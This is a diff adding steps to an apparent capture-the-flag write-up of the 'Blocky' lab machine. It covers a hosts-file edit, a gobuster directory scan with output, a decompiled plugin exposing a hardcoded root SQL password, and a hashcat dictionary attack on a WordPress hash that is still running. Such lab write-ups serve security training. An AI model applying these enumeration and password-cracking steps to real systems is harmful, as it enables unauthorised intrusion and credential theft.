@@ -26,12 +26,94 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 292.59 seconds
 ```
 
+```bash
+vi /etc/hosts
+```
+(pic)
 
 
 
+```bash
+gobuster dir -u http://blocky.htb -w /usr/share/wordlists/dirb/big.txt
+```
+```bash
+===============================================================
+[+] Url:                     http://blocky.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.htpasswd            (Status: 403) [Size: 294]
+.htaccess            (Status: 403) [Size: 294]
+javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
+phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
+plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
+server-status        (Status: 403) [Size: 298]
+wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
+wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
+wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
+wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
+Progress: 20469 / 20469 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
 
+```bash
+cat BlockyCore.java
+```
+```bash
+package com.myfirstplugin;
 
+/* JADX INFO: loaded from: BlockyCore.class */
+public class BlockyCore {
+    public String sqlHost = "localhost";
+    public String sqlUser = "root";
+    public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
 
+    public void onServerStart() {
+    }
+
+    public void onServerStop() {
+    }
+
+    public void onPlayerJoin() {
+        sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
+    }
+
+    public void sendMessage(String username, String message) {
+    }
+}
+```
+
+```bash
+hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
+```bash
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 400 (phpass)
+Hash.Target......: $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/
+Time.Started.....: Mon Oct 26 02:09:35 2026 (1 min, 35 secs)
+Time.Estimated...: Mon Oct 26 02:51:59 2026 (40 mins, 49 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:     5636 H/s (11.82ms) @ Accel:74 Loops:1024 Thr:1 Vec:8
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 536944/14344385 (3.74%)
+Rejected.........: 0/536944 (0.00%)
+Restore.Point....: 536944/14344385 (3.74%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:4096-5120
+Candidate.Engine.: Device Generator
+Candidates.#01...: afatsum -> abbey05
+Hardware.Mon.#01.: Util: 90%
+```
 
 
 
